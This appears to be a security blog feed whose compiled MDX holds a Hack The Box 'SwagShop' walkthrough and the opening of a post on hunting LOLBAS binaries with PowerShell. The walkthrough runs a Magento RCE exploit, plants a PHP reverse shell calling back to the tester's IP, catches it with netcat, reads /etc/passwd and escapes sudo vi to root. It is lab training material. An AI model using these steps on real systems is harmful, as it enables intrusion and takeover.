+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;❯-exploitation&quot;
+  }, &quot;\u276F Exploitation&quot;), mdx(&quot;p&quot;, null, &quot;We use &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;searchsploit&quot;), &quot; to find exploits in &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magneto 1.9.x&quot;), &quot; &quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;905px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;39.11602209944751%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVklEQVQY002QWXKDMBAFfZF4AWxLIEASCK0g7Nh4i7Pc/zJ5JPlI1RQ1TKmlN71g3DJmadGRXAkxENomaZlkVZpV/7/Ztk6ycpOyTcKSdB7id0F2DaVqtxfLNXlZ7Zcbutrk/2u5pum24rwvS5sXHSsNMMxx0WKr220lKWmlHDgfpIyqPUo5oqlqjyxNM1aVQ6/aQ6deUUodaa5mmLw5qnVVuOBuwd+Du/f+bs1kzcWYSeszyIJp3Z16/4j9M4bncfxCCiSaYeacrAelDlafnbl4e+vUybubs9dGjkiIDY0+D+ExDu+owT/+4N2bESF6fe30CWTbjHgE2bBkXYc9aXAo23HdnYOf4fnx/smYmeFqivUUrbvgqNVIe0U87AmFMA9D66QAbPSE+SF+HuMHGizysiILKSLpTS7Nj0wtBZyNAuZE/JXHecAtXAw/ql4RoW0OgOH8Gw48X+un/KBtAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/7eb81925d7b8163c861c0c069a299151/d7601/searchsploit.webp 905w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 905px) 100vw, 905px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png 905w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 905px) 100vw, 905px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png&quot;,
+    &quot;alt&quot;: &quot;searchsploit.png&quot;,
+    &quot;title&quot;: &quot;searchsploit.png&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;and we notice a remote code execution exploit&quot;), mdx(&quot;table&quot;, null, mdx(&quot;thead&quot;, {
+    parentName: &quot;table&quot;
+  }, mdx(&quot;tr&quot;, {
+    parentName: &quot;thead&quot;
+  }, mdx(&quot;th&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), &quot;Exploit Title&quot;), mdx(&quot;th&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), &quot;Path  (/usr/share/exploitdb/)&quot;))), mdx(&quot;tbody&quot;, {
+    parentName: &quot;table&quot;
+  }, mdx(&quot;tr&quot;, {
+    parentName: &quot;tbody&quot;
+  }, mdx(&quot;td&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), &quot;Magento eCommerce - Remote Code Execution&quot;), mdx(&quot;td&quot;, _extends({
+    parentName: &quot;tr&quot;
+  }, {
+    &quot;align&quot;: null
+  }), &quot;exploits/xml/webapps/37977.py&quot;)))), mdx(&quot;p&quot;, null, &quot; We need to tweak the exploit a little for the odd &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$IP/index.php/admin&quot;), &quot; requirement instead of &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$IP/admin&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-Python&quot;
+  }), &quot;...\ntarget = \&quot;http://10.10.10.140/\&quot;\n\nif not target.startswith(\&quot;http\&quot;):\n   target = \&quot;http://\&quot; + target\n\nif target.endswith(\&quot;/\&quot;):\n   target = target[:-1]\n\ntarget_url = target + \&quot;/index.php\&quot; + \&quot;/admin/Cms_Wysiwyg/directive/index/\&quot;\n...\n&quot;)), mdx(&quot;p&quot;, null, &quot;we run the script &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022 \u279C python 37977.py  \n \u2514&gt; WORKED\n    Check http://10.10.10.140/admin with creds forme:forme\n&quot;)), mdx(&quot;p&quot;, null, &quot;now we can log in to the admin panel &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/index.php/admin&quot;), &quot; and &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/downloader&quot;), &quot; with creds &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;forme:forme&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;❯-getting-a-reverse-shell&quot;
+  }, &quot;\u276F Getting a Reverse Shell&quot;), mdx(&quot;p&quot;, null, &quot;Using the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; Downloader/&quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; Connect, we attempt to upload an\nextension with a PHP reverse shell.&quot;), mdx(&quot;p&quot;, null, &quot;Download any legit &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Magento&quot;), &quot; package, we\u2019ll use &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;LavaMagentoBD&quot;), &quot; from &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/P34C3-07/LavaMagentoBD&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;GitHub/P34C3-07/LavaMagentoBD&quot;), &quot; then extract &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;lavamagento_bd.tgz&quot;), &quot; we\u2019ll have to modify its contents.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C tar -xzvf lavalamp_magento_bd.tgz\n&quot;)), mdx(&quot;p&quot;, null, &quot;edit the file &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;./App/code/community/Lavalamp/Connector/controllers/IndexController.php&quot;), &quot; and replace its contents with a PHP reverse shell, we\u2019ll use PHP-Reverse-Shell from &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/pentestmonkey/php-reverse-shell&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Github/pentestmonkey/php-reverse-shell&quot;), &quot; make sure to change the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;$IP&quot;), &quot; field to your IP address. we will use port &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;1234&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;$ip = &apos;10.10.14.115&apos;;  // CHANGE THIS\n$port = 1234;\n&quot;)), mdx(&quot;p&quot;, null, &quot;get the &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;MD5&quot;), &quot; hash for the file&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022 \u279C md5sum ./App/code/community/Lavalamp/Connector/controllers/IndexController.php    \n\u2514&gt; 7587816c42712b0c9fe6dccb2c6c5300  IndexController.php\n&quot;)), mdx(&quot;p&quot;, null, &quot;copy it then edit &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;package.xml&quot;), &quot; and replace &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;IndexController.php&quot;), &quot; hash&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-xml&quot;
+  }), &quot;    &lt;dir name=\&quot;controllers\&quot;&gt;\n        &lt;file hash=\&quot;7587816c42712b0c9fe6dccb2c6c5300\&quot; \n              name=\&quot;IndexController.php\&quot;/&gt;\n    &lt;/dir&gt;\n&quot;)), mdx(&quot;p&quot;, null, &quot;compress the files back into &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;.tgz&quot;), &quot; file&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C tar -cvzf lavalamp_magento_bd.tgz -c ./*\n&quot;)), mdx(&quot;p&quot;, null, &quot;then upload the file to &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/downloader/&quot;), &quot; login with creds &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;forme:forme&quot;), &quot; if the extension is loaded successfully you should see&quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1149px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;36.81462140992167%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAXklEQVQY08WOSw6DMAxEPZ8oBlU0gd7/rE04AKXd9GlkefPsCTf5KW8aCwogwOckAnFBZoYPl5fV7G6uZFIPaSEXjiuf5D5/ehcTw2Rl3GPKs+RIOVPBii/kn/mr/AbYBAJqW0VoJgAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b4f74a195e0f4a0da633e6d5f3c10a09/147f1/uploaded.webp 1149w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1149px) 100vw, 1149px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png 1149w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1149px) 100vw, 1149px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png&quot;,
+    &quot;alt&quot;: &quot;uploaded.png&quot;,
+    &quot;title&quot;: &quot;uploaded.png&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;start listening using netcat&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C nc -v -n -l -p 1234\n&quot;)), mdx(&quot;p&quot;, null, &quot;then in the browser navigate to &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php&quot;), &quot;\nin the terminal you should see that we got a reverse shell &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C nc -nvlp 1234\n\u2514&gt; listening on [any] 1234 ...\n   connect to [&lt;IP&gt;] from (UNKNOWN) [10.10.10.140] 44650\n   Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP x86_64 GNU/Linux\n   13:22:28 up 32 min,  0 users,  load average: 4.31, 2.61, 1.86\n   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n   uid=33(www-data) gid=33(www-data) groups=33(www-data)\n   /bin/sh: 0: can&apos;t access tty; job control turned off\n&quot;)), mdx(&quot;p&quot;, null, &quot;we  are connected now with the username &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;www-data&quot;), &quot;, but we still need to spawn a bash shell with tty&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;$ python -c &apos;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&apos;\nwww-data@swagshop:/$ \n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-own-user&quot;
+  }, &quot;\u276F Own User&quot;), mdx(&quot;p&quot;, null, &quot;Now that we have a shell on the box we can view &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;etc/passwd&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C www-data@swagshop:/$ cat /etc/passwd\n\u2514&gt; cat /etc/passwd\n   root:x:0:0:root:/root:/bin/bash\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/bin/bash\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:...\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   systemd-timesync:x:100:102:systemd Time Synchronization,,,:...\n   systemd-network:x:101:103:systemd Network Management,,,:...\n   systemd-resolve:x:102:104:systemd Resolver,,,:...\n   systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/...\n   syslog:x:104:108::/home/syslog:/bin/false\n   _apt:x:105:65534::/nonexistent:/bin/false\n   lxd:x:106:65534::/var/lib/lxd/:/bin/false\n   mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false\n   messagebus:x:108:112::/var/run/dbus:/bin/false\n   uuidd:x:109:113::/run/uuidd:/bin/false\n   dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false\n   sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin\n   haris:x:1000:1000:haris,,,:/home/haris:/bin/bash\n&quot;)), mdx(&quot;p&quot;, null, &quot;we notice the user &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;haris&quot;), &quot; &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C www-data@swagshop:/$ ls -alh /home/haris\n\u2514&gt; ls -alh /home/haris\n   total 36K\n   drwxr-xr-x 3 haris haris 4.0K May  8 09:21 .\n   drwxr-xr-x 3 root  root  4.0K May  2 14:48 ..\n   -rw------- 1 haris haris   54 May  2 14:56 .Xauthority\n   lrwxrwxrwx 1 root  root     9 May  8 09:20 .bash_history -&gt; /dev/null\n   -rw-r--r-- 1 haris haris  220 May  2 14:48 .bash_logout\n   -rw-r--r-- 1 haris haris 3.7K May  2 14:48 .bashrc\n   drwx------ 2 haris haris 4.0K May  2 14:49 .cache\n   -rw------- 1 root  root     1 May  8 09:20 .mysql_history\n   -rw-r--r-- 1 haris haris  655 May  2 14:48 .profile\n   -rw-r--r-- 1 haris haris    0 May  2 14:49 .sudo_as_admin_successful\n   -rw-r--r-- 1 haris haris   33 May  8 09:01 user.txt\n\n&quot;)), mdx(&quot;p&quot;, null, &quot;we find &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;user.txt&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C www-data@swagshop:/$ cat /home/haris/user.txt\n\u2514&gt; cat /home/haris/user.txt\n   &lt;user flag&gt;\n&quot;)), mdx(&quot;h2&quot;, {
+    &quot;id&quot;: &quot;❯-privilege-escalation-own-root&quot;
+  }, &quot;\u276F Privilege Escalation: Own Root&quot;), mdx(&quot;p&quot;, null, &quot;Enumerating the system leads to the finding that &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;sudo -l&quot;), &quot; returns the\nlist of the user\u2019s privileges, and shows that running &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;vi&quot;), &quot; with a specific path &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;/var/www/html/*&quot;), &quot;\ngrants superuser privileges, without a password entry, required&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C www-data@swagshop:/$ sudo -l\n\u2514&gt; sudo -l\n   Matching Defaults entries for www-data on swagshop:\n       env_reset, mail_badpass,\n       secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\\n       :/sbin\\:/bin\\:/snap/bin\n   \n   User www-data may run the following commands on swagshop:\n       (root) NOPASSWD: /usr/bin/vi /var/www/html/*\n&quot;)), mdx(&quot;p&quot;, null, &quot;open a file using &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;vi&quot;), &quot; in &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;/var/www/html/*&quot;)), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/Bad3r.sh\n\u2514&gt; sudo /usr/bin/vi /var/www/html/Bad3r.sh\n   Vim: Warning: Output is not to a terminal\n   Vim: Warning: Input is not from a terminal\n   \n   E558: Terminal entry not found in terminfo\n   \u2018unknown\u2019 not known. Available builtin terminals are:\n    builtin_amiga\n    builtin_beos-ansi\n    builtin_ansi\n    builtin_pcansi\n    builtin_win32\n    builtin_vt320\n    builtin_vt52\n    builtin_xterm\n    builtin_iris-ansi\n    builtin_debug\n    builtin_dumb\n   defaulting to \u2018ansi\u2019\n&quot;)), mdx(&quot;p&quot;, null, &quot;inside &quot;, mdx(&quot;inlineCode&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;vi&quot;), &quot; you can spawn a root shell&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;:!/bin/bash\n~\n~\n&quot;)), mdx(&quot;p&quot;, null, &quot;in the interactive shell, we can get the root flag&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {}), &quot;\u2022\u279C whoami\n\u2514&gt; root\n\u2022\u279C cat /root/root.txt\n     &lt;root flag&gt;\n        ___ ___\n      /| |/|\\| |\\\n     /_| \xB4 |.` |_\\           We are open! (Almost)\n     |     | .   |                                   |\n     | --- | --- | --------------------------------- |\n     |     | .   | Join the beta HTB Swag Store!     |\n     | ___ | .__ | https://hackthebox.store/password |\n   \n                      PS: Use root flag as password!\n&quot;)));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item><item><title><![CDATA[The Hunt for LOLBAS]]></title><description><![CDATA[Using Powershell to Hunt for LOLBAS]]></description><link>https://secbytes.net/The-Hunt-for-LOLBAS</link><guid isPermaLink="false">https://secbytes.net/The-Hunt-for-LOLBAS</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Sat, 13 Jul 2019 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;The Hunt for LOLBAS&quot;,
+  &quot;author&quot;: &quot;NotoriousRebel&quot;,
+  &quot;date&quot;: &quot;2019-07-13T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/hunt_lolbas_logo.png&quot;,
+  &quot;excerpt&quot;: &quot;Using Powershell to Hunt for LOLBAS&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;h1&quot;, {
+    &quot;id&quot;: &quot;hunting-for-lolbas&quot;
+  }, &quot;Hunting for LOLBAS&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;introduction&quot;
+  }, &quot;Introduction&quot;), mdx(&quot;p&quot;, null, &quot;Like many pentesters I am a big fan of the &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/LOLBAS-Project/LOLBAS&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;LOLBAS&quot;), &quot; project.\nand even recently contributed to &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/LOLBAS-Project/LOLBAS/pull/40&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;it&quot;), &quot;. Although, the project is\nincredibly useful I couldn\u2019t find a tool that automated the process\nof finding them so I decided to make one.\nThen again how useful are they for redteamers? The answer is incredibly useful.\nA recent attack dubbed &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Astaroth&quot;), &quot; utilized LOLBAS for every step of the attack\nafter initial compromise. &quot;), mdx(&quot;p&quot;, null, &quot;With a goal in mind, I turned to Powershell.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;understanding-lolbas&quot;
+  }, &quot;Understanding LOLBAS&quot;), mdx(&quot;p&quot;, null, &quot;Before automating the hunt for LOLBAS it\u2019s important to understand\nwhat they are. LOLBAS stands for living off the land binaries and scripts,\na simple example, as leveraged in my last post is regsvr32. A seemingly\ninconspicuous executable being used for code execution. Binaries and scripts\nthat can be used in creative ways that benefit blueteam and redteam. Blueteam\nas it can show possible attack vectors that should be monitored and understood.\nRedteam as utilizing these possible attack vectors if present, may be less likely\nnoticed and being run by a trusted source.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;python---powershell&quot;
+  }, &quot;Python -&gt; Powershell&quot;), mdx(&quot;p&quot;, null, &quot;With Linux being taken care of by &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
